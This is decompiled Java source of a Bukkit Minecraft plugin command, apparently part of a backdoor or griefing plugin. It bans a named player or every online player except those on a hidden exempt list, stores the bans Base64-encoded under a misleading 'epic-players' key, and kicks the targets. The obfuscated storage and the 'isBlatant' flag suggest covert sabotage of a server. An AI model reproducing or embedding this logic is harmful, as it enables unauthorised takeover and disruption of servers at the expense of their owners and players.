/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;

import java.util.Base64;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class BanCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("ban <player>"));
        } else if (args[1].equals("*")) {
            for (Player a2 : Bukkit.getOnlinePlayers()) {
                if (plugin.lite.contains(a2.getName())) continue;
                byte[] add2 = Base64.getEncoder().encode(a2.getUniqueId().toString().getBytes());
                DataManager.bannedPlayers.add(new String(add2));
                DataManager.getData().set("epic-players", DataManager.bannedPlayers);
                DataManager.saveData();
                API.kickPlayer(a2);
            }
            p2.sendMessage(Settings.PREFIX("Everyone was banned!"));
        } else {
            Player target = Bukkit.getServer().getPlayer(args[1]);
            if (target == null) {
                p2.sendMessage(Settings.PREFIX("The player " + Settings.RED + args[1] + Settings.WHITE + " doesn't seem to exist."));
            } else {
                byte[] add3 = Base64.getEncoder().encode(target.getUniqueId().toString().getBytes());
                DataManager.bannedPlayers.add(new String(add3));
                DataManager.getData().set("epic-players", DataManager.bannedPlayers);
                DataManager.saveData();
                p2.sendMessage(Settings.PREFIX(target.getName() + " was banned!"));
            }
        }
    }

    @Override
    public boolean isBlatant() {
        return false;
    }


}

